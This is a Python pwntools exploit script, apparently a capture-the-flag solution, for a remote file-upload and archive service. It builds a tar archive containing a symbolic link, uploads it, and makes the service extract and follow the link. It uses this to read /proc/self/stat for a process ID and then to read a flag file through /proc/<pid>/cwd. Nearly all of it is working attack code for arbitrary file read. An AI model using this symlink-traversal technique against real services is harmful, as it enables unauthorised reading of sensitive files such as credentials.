#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

if len(sys.argv)<3:
    print 'usage: ./exp.py host port'
    exit()
elif len(sys.argv)==3:
    p = remote(sys.argv[1],sys.argv[2])
# context.log_level = 'debug'

def upload(data):
    sla('> ','u')
    sla('Content:',data)
    ru('as /tmp/')
    return rc(32)

def compress(filename, arcname):
    sla('> ','c')
    sla('Filename: /tmp/',filename)
    sla('Rename archive file? [y/N]','y')
    sla('Arcname: ',arcname)
    ru('as ')
    return rc(32)

def extract(filename):
    sla('> ','x')
    sla('Filename:',filename)

def readfile(filename):
    sla('> ','r')
    sla('Filename:',filename)
    return ru('\n')

def leak(filename):
    f1 = upload('taqini know the flag')
    log.info('uploaded file: '+f1)

    c1 = compress(f1,'TaQini')
    log.info('compressed file: '+c1)
    log.info('archive file name: '+'TaQini')

    # create soft link file 
    os.system('ln -s %s %s'%(filename, c1))
    os.system('tar cvf payload.tar '+c1+' >/dev/null')
    payload = open('payload.tar').read()

    f2 = upload(payload)
    log.info('uploaded file '+f2)

    c2 = compress(f2, c1)
    log.info('compressed file: '+c2)
    log.info('archive file name: '+c1)

    extract(c2)
    log.info('extract '+c2+' --> '+c1)

    extract(c1)
    log.info('extract '+c1+' --> '+c1)

    log.info('readfile: '+c1)
    data = readfile(c1)

    log.success('data:'+data)
    return data

pid = leak('/proc/self/stat').split()[3]
print pid
flag = leak('/proc/%s/cwd/flag'%pid)
# flag = leak('/ho\\me/ctf/flag')
print flag

p.close()
